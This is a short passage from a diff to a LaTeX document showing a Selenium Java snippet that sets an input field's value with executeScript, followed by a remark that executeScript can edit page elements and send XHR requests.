+			Id('productStatus'));
+	String newValue = "New Value";
+	driver.executeScript("arguments[0].setAttribute('value',
+			arguments[1])", inputField, newValue);
+\end{lstlisting}
+\lstinline|executeScript| is a powerful tool: it enables to edit manually elements and send XHR requests.
+
+\end{document}
